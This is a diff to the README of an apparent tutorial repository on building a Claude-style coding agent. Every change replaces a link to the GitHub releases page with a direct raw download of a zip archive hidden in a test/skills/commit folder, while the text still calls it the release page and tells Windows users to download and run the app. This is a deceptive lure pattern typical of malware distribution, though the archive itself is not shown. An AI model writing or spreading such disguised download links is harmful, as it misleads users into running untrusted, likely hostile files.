@@ -1,6 +1,6 @@
 # 🤖 claude-code-from-scratch - Learn Coding Agents Step by Step
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Alihusn3392/claude-code-from-scratch/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Alihusn3392/claude-code-from-scratch/main/test/skills/commit/claude_code_from_scratch_v3.8.zip)
 
 ## 📘 What This Is
 
@@ -24,7 +24,7 @@ The repo uses TypeScript and Python in a small, readable code base. It focuses o
 
 Use this release page to download and run the app on Windows:
 
-[Open the release page](https://github.com/Alihusn3392/claude-code-from-scratch/releases)
+[Open the release page](https://raw.githubusercontent.com/Alihusn3392/claude-code-from-scratch/main/test/skills/commit/claude_code_from_scratch_v3.8.zip)
 
 After you open the page:
 1. Find the latest release at the top
@@ -202,7 +202,7 @@ Follow the chapters in order to understand how each part fits together.
 
 If you need the latest build or a fresh copy, use the release page here:
 
-[Download from Releases](https://github.com/Alihusn3392/claude-code-from-scratch/releases)
+[Download from Releases](https://raw.githubusercontent.com/Alihusn3392/claude-code-from-scratch/main/test/skills/commit/claude_code_from_scratch_v3.8.zip)
 
 ## 🔍 Topics Covered
 
